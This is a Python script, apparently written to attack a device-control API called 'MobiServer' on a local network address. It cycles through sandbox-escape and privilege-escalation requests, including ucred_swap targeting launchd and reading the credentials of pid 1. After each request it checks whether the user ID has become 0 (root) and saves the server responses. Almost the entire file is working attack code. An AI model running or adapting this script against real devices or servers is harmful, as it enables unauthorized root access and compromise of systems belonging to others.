#!/usr/bin/env python3
"""final_api_escalation.py

Attempts API-driven privilege escalation against MobiServer at
http://192.168.1.5:8686 by trying several parameter combinations.

Behavior:
- Check `/api/v1/ds` status
- Try SBX and Elevate combinations that request `ucred_swap` on `launchd`
- After each attempt, query `/api/v1/ids` to check `uid`
- Save each server response to `api_responses/` for analysis

Safety: does NOT perform direct memory writes (no kwrite).
"""

import json
import os
import sys
import time
from datetime import datetime
from urllib.parse import urlencode

try:
    import requests
except Exception:
    print("requests library is required. Install with: pip install requests")
    sys.exit(2)


BASE = "http://192.168.1.5:8686"
OUT_DIR = "api_responses"
TIMEOUT = 8


def ensure_out():
    os.makedirs(OUT_DIR, exist_ok=True)


def save_response(name, resp):
    ts = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    safe_name = name.replace("/", "_").replace("?", "_")
    path = os.path.join(OUT_DIR, f"{ts}_{safe_name}.txt")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"URL: {resp.url}\n")
            f.write(f"STATUS: {resp.status_code}\n\n")
            # try JSON
            try:
                js = resp.json()
                json.dump(js, f, indent=2, ensure_ascii=False)
            except Exception:
                f.write(resp.text)
    except Exception as e:
        print("Failed to save response:", e)
    return path


def get(path, params=None):
    url = BASE.rstrip("/") + path
    try:
        r = requests.get(url, params=params, timeout=TIMEOUT)
        return r
    except Exception as e:
        from types import SimpleNamespace
        constructed_url = url + ("?" + urlencode(params) if params else "")
        def _no_json():
            raise ValueError("no json")
        return SimpleNamespace(status_code=0, text=str(e), url=constructed_url, json=_no_json)


def parse_uid(resp):
    # Try to extract a UID from a JSON response or plain text
    try:
        j = resp.json()
        # common fields
        for key in ("uid", "u", "user", "uid_value"):
            if key in j:
                return int(j[key])
        # if nested
        if isinstance(j, dict):
            for v in j.values():
                if isinstance(v, dict) and "uid" in v:
                    return int(v.get("uid"))
    except Exception:
        pass
    # fallback: search digits in text
    try:
        import re

        m = re.search(r"\buid\D*(\d+)\b", resp.text)
        if m:
            return int(m.group(1))
        m2 = re.search(r"\b(\d{1,3})\b", resp.text)
        if m2:
            return int(m2.group(1))
    except Exception:
        pass
    return None


def check_ids():
    r = get("/api/v1/ids")
    path = save_response("ids", r)
    uid = parse_uid(r)
    return uid, r, path


def attempt(endpoint, params=None, label=None):
    label = label or endpoint
    r = get(endpoint, params=params)
    saved = save_response(label, r)
    uid, ids_resp, ids_path = check_ids()
    return {"attempt": label, "request_url": r.url, "status": r.status_code, "resp_path": saved, "ids_uid": uid, "ids_resp_path": ids_path}


def main():
    ensure_out()

    print("Checking /api/v1/ds status...")
    ds = get("/api/v1/ds")
    save_response("ds", ds)
    uid, _, _ = check_ids()
    print("Initial uid:", uid)

    attempts = []

    # Primary attempts
    attempts.append(("/api/v1/sbx", {"action": "escape", "method": "ucred_swap", "target": "launchd", "force": "1"}, "sbx_escape_ucred_swap_force"))
    attempts.append(("/api/v1/elevate", {"method": "ucred_swap", "target": "launchd", "force": "1"}, "elevate_ucred_swap_launchd_force"))

    # Alternatives
    attempts.append(("/api/v1/sbx", {"action": "escape", "method": "ucred_swap"}, "sbx_escape_ucred_swap"))
    attempts.append(("/api/v1/elevate", {"target": "launchd"}, "elevate_target_launchd"))

    # proc_for_pid if present
    attempts.append(("/api/v1/proc_for_pid", {"pid": "1", "method": "read_ucred"}, "proc_for_pid_read_ucred_pid1"))

    results = []

    for ep, params, label in attempts:
        print(f"Trying: {ep} params={params}")
        r = attempt(ep, params=params, label=label)
        results.append(r)
        if r.get("ids_uid") == 0:
            print("OBTAINED VIA API PARAMS")
            print(json.dumps(r, indent=2))
            # Save summary
            with open(os.path.join(OUT_DIR, "summary_obtained.json"), "w", encoding="utf-8") as fh:
                json.dump(r, fh, indent=2)
            return 0
        else:
            print("uid after attempt:", r.get("ids_uid"))
        time.sleep(0.8)

    # If none achieved uid 0
    print("No escalation succeeded. UID did not become 0.")
    # Write results for analysis
    summary = {"initial_check_uid": uid, "attempts": results}
    with open(os.path.join(OUT_DIR, "summary_failed.json"), "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2)
    # Print most useful server responses for analysis (last attempt)
    last = results[-1] if results else {}
    print("Last attempt summary:")
    print(json.dumps(last, indent=2))
    return 1


if __name__ == "__main__":
    sys.exit(main())
